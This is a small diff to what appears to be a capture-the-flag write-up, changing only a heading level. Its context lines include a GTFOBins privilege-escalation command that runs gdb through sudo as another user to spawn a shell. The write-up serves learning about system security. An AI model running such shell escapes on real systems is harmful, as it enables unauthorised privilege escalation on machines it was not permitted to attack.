@@ -63,7 +63,7 @@ We can escalate ourselves to \* using the following from gtfobins.
 sudo -u thirtytwo /var/www/gdb -nx -ex '!sh' -ex quit
 ```
 
-## Analysis
+### Analysis
 
 The user is now (thirytwo) and we can find a file in `/home/thirtytwo` which contains the following.
 
